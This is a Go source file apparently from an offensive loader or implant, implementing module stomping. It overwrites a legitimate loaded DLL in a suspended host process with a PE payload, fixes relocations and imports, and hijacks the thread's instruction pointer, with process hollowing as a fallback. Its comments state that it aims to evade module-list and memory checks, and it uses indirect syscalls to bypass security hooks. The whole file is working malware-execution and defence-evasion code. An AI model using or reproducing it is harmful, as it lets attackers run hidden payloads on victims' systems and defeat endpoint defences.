// stomp.go — module-stomping execution (preferred over classic hollowing).
//
// Instead of unmapping the host image and allocating anonymous memory, the
// payload is written over an ALREADY-LOADED legitimate module (e.g. combase.dll)
// in a suspended host process. The PEB loader data still lists that signed DLL,
// so memory-rotation/module-list checks see a legit module region, not a fresh
// anonymous RWX allocation. Falls back to classic hollowing when no loaded
// module is large enough for the payload.
//
// When InitEvasion() succeeded, memory/thread operations use indirect syscalls
// (ntSyscall) with numbers taken from a clean ntdll; otherwise plain API calls.

package main

import (
	"bytes"
	"debug/pe"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

const (
	TH32CS_SNAPMODULE   = 0x00000008
	TH32CS_SNAPMODULE32 = 0x00000010
)

type moduleEntry32W struct {
	Size          uint32
	ModuleID      uint32
	ProcessID     uint32
	GlblcntUsage  uint32
	ProccntUsage  uint32
	ModBaseAddr   uintptr
	ModBaseSize   uint32
	ModuleHandle  uintptr
	Module        [256]uint16
	ExePath       [260]uint16
}

func payloadImageSize(payload []byte) uint32 {
	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil {
		return uint32(len(payload))
	}
	defer f.Close()
	if oh, ok := f.OptionalHeader.(*pe.OptionalHeader64); ok {
		return uint32(oh.SizeOfImage)
	}
	return uint32(len(payload))
}

// pickStompModule returns the largest loaded module in pid whose size >= minSize.
func pickStompModule(pid uint32, minSize uint32) (uintptr, uint32, bool) {
	var snap uintptr
	var firstW, nextW uintptr
	if ev.Ready && ev.CreateToolhelp32Snap != 0 {
		snap, _, _ = syscall.SyscallN(ev.CreateToolhelp32Snap, TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, uintptr(pid))
		firstW, nextW = ev.Module32FirstW, ev.Module32NextW
	} else {
		snap, _, _ = procCreateToolhelp32Snap.Call(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, uintptr(pid))
		firstW, nextW = procModule32FirstW.Addr(), procModule32NextW.Addr()
	}
	if snap == 0 || snap == INVALID_HANDLE_VALUE {
		return 0, 0, false
	}
	defer procCloseHandle.Call(snap)

	best := uintptr(0)
	bestSize := uint32(0)
	me := &moduleEntry32W{}
	me.Size = uint32(unsafe.Sizeof(*me))
	has := func() bool {
		if firstW == 0 {
			return false
		}
		r, _, _ := syscall.SyscallN(firstW, snap, uintptr(unsafe.Pointer(me)))
		return r != 0
	}
	next := func() bool {
		if nextW == 0 {
			return false
		}
		r, _, _ := syscall.SyscallN(nextW, snap, uintptr(unsafe.Pointer(me)))
		return r != 0
	}
	if !has() {
		return 0, 0, false
	}
	for {
		if me.ModBaseSize >= minSize && me.ModBaseSize > bestSize {
			best, bestSize = me.ModBaseAddr, me.ModBaseSize
		}
		if !next() {
			break
		}
	}
	if best == 0 {
		return 0, 0, false
	}
	return best, bestSize, true
}

func ntProtectRemote(h, addr uintptr, size uint32, newProt uint32) error {
	base := addr
	sz := uintptr(size)
	var old uint32
	r := ntSyscall(uintptr(ev.NtProtectVirtualMemory),
		h,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(newProt),
		uintptr(unsafe.Pointer(&old)), 0)
	if r != 0 {
		return fmt.Errorf("NtProtectVirtualMemory status=0x%x", r)
	}
	return nil
}

func ntWriteRemote(h, addr uintptr, data []byte) error {
	var written uintptr
	r := ntSyscall(uintptr(ev.NtWriteVirtualMemory),
		h, addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)), 0)
	if r != 0 {
		return fmt.Errorf("NtWriteVirtualMemory status=0x%x", r)
	}
	return nil
}

func ntSetCtxRemote(thread uintptr, ctx *contextAMD64) error {
	r := ntSyscall(uintptr(ev.NtSetContextThread), thread, uintptr(unsafe.Pointer(ctx)), 0, 0, 0, 0)
	if r != 0 {
		return fmt.Errorf("NtSetContextThread status=0x%x", r)
	}
	return nil
}

func ntGetCtxRemote(thread uintptr, ctx *contextAMD64) error {
	r := ntSyscall(uintptr(ev.NtGetContextThread), thread, uintptr(unsafe.Pointer(ctx)), 0, 0, 0, 0)
	if r != 0 {
		return fmt.Errorf("NtGetContextThread status=0x%x", r)
	}
	return nil
}

func ntResumeRemote(thread uintptr) error {
	var count uint32
	r := ntSyscall(uintptr(ev.NtResumeThread), thread, uintptr(unsafe.Pointer(&count)), 0, 0, 0, 0)
	if r != 0 {
		return fmt.Errorf("NtResumeThread status=0x%x", r)
	}
	return nil
}

// stompRun executes payload over a legit loaded module in a suspended host.
func stompRun(payload []byte) error {
	host := hostProc()
	pi, err := createSuspendedProcess(host)
	if err != nil {
		return err
	}
	defer procCloseHandleH.Call(pi.ProcessHandle)
	defer procCloseHandleH.Call(pi.ThreadHandle)

	size := payloadImageSize(payload)
	if size == 0 {
		size = uint32(len(payload))
	}
	modBase, _, ok := pickStompModule(pi.ProcessID, size)
	if !ok {
		fmt.Fprintf(os.Stderr, "stomp: no module >= %d bytes, falling back to hollow\n", size)
		return hollowSuspended(pi, payload)
	}
	fmt.Fprintf(os.Stderr, "stomp: target module base=0x%x size=%d payload=%d\n", modBase, size, uint32(len(payload)))

	f, err := pe.NewFile(bytes.NewReader(payload))
	if err != nil {
		return err
	}
	defer f.Close()
	oh, ok2 := f.OptionalHeader.(*pe.OptionalHeader64)
	if !ok2 {
		return fmt.Errorf("only PE32+ (x64) supported")
	}
	entryOffset := oh.AddressOfEntryPoint

	if ev.Ready {
		if err := ntProtectRemote(pi.ProcessHandle, modBase, size, 0x40); err != nil {
			return err
		}
	} else if ev.VirtualProtectEx != 0 {
		var old uint32
		syscall.SyscallN(ev.VirtualProtectEx, pi.ProcessHandle, modBase, uintptr(size), 0x40, uintptr(unsafe.Pointer(&old)))
	} else {
		var old uint32
		procVirtualProtectExH.Call(pi.ProcessHandle, modBase, uintptr(size), 0x40, uintptr(unsafe.Pointer(&old)))
	}

	// write headers
	hdrSize := int(oh.SizeOfHeaders)
	if hdrSize > len(payload) {
		hdrSize = len(payload)
	}
	if ev.Ready {
		if err := ntWriteRemote(pi.ProcessHandle, modBase, payload[:hdrSize]); err != nil {
			return err
		}
	} else {
		if err := writeRemote(pi.ProcessHandle, modBase, payload[:hdrSize]); err != nil {
			return err
		}
	}
	// write sections
	for _, s := range f.Sections {
		data, err := s.Data()
		if err != nil || len(data) == 0 {
			continue
		}
		dst := modBase + uintptr(s.VirtualAddress)
		if ev.Ready {
			if err := ntWriteRemote(pi.ProcessHandle, dst, data); err != nil {
				return err
			}
		} else if err := writeRemote(pi.ProcessHandle, dst, data); err != nil {
			return err
		}
	}

	// relocations for delta = modBase - payloadImageBase
	delta := uint64(modBase) - oh.ImageBase
	if delta != 0 {
		if err := applyRelocationsRemote(pi.ProcessHandle, modBase, f, payload, delta); err != nil {
			return err
		}
	}
	if err := (&ReflectiveLoader{Image: payload}).fixImportsRemote(pi.ProcessHandle, modBase, f); err != nil {
		return err
	}

	entry := uint64(modBase) + uint64(entryOffset)
	ctx := &contextAMD64{ContextFlags: CONTEXT_FULL}
	if ev.Ready {
		if err := ntGetCtxRemote(pi.ThreadHandle, ctx); err != nil {
			return err
		}
	} else if rr, _, e := procGetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.Rip = entry
	if ev.Ready {
		if err := ntSetCtxRemote(pi.ThreadHandle, ctx); err != nil {
			return err
		}
	} else if rr, _, e := procSetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("SetThreadContext: %v", e)
	}
	if ev.Ready {
		if err := ntResumeRemote(pi.ThreadHandle); err != nil {
			return err
		}
	} else if rr, _, e := procResumeThreadH.Call(pi.ThreadHandle); rr == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread: %v", e)
	}
	fmt.Fprintf(os.Stderr, "stomp: OK host=%s pid=%d mod=0x%x entry=0x%x\n", host, pi.ProcessID, modBase, entry)
	return nil
}

// hollowSuspended is the classic-hollow fallback used by stompRun and runStage.
func hollowSuspended(pi *processInformation, payload []byte) error {
	l := NewReflectiveLoader(payload)
	entry, err := l.hollow(pi)
	if err != nil {
		return err
	}
	ctx := &contextAMD64{ContextFlags: CONTEXT_FULL}
	if rr, _, e := procGetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("GetThreadContext: %v", e)
	}
	ctx.Rip = uint64(entry)
	if rr, _, e := procSetThreadContextH.Call(pi.ThreadHandle, uintptr(unsafe.Pointer(ctx))); rr == 0 {
		return fmt.Errorf("SetThreadContext: %v", e)
	}
	if rr, _, e := procResumeThreadH.Call(pi.ThreadHandle); rr == 0xFFFFFFFF {
		return fmt.Errorf("ResumeThread: %v", e)
	}
	fmt.Fprintf(os.Stderr, "loader stager: hollow OK host=%s pid=%d entry=0x%x\n", hostProc(), pi.ProcessID, entry)
	return nil
}

var _ = os.Getenv
